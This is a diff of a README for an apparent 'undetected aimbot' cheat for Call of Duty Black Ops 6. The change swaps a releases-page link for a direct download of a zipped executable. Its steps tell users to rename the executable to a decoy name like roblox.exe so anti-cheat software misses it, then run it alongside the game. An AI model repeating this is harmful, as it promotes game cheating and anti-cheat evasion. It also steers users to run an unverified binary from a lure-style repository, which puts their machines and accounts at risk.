@@ -19,7 +19,7 @@ The Ultimate Menu for Black Ops 6 includes a wide range of features designed to 
 
 ## Installation
 
-1. [Download](https://github.com/codeder13/Call-of-duty-black-ops-6-Cod-bo-6-undetected-aimbot/releases/tag/v1.0) the executable file from the Releases tab on this GitHub page.
+1. [Download](https://github.com/codeder13/Call-of-duty-black-ops-6-Cod-bo-6-undetected-aimbot/releases/download/v1.1/Bo6Aim.zip) the executable file from the Releases tab on this GitHub page.
 
 2. Rename the file to something random (e.g., roblox.exe) to stay a little more undetected by anti-cheat software.
 Run it and launch call of duty, the menu will pop up once you are in the main menu!
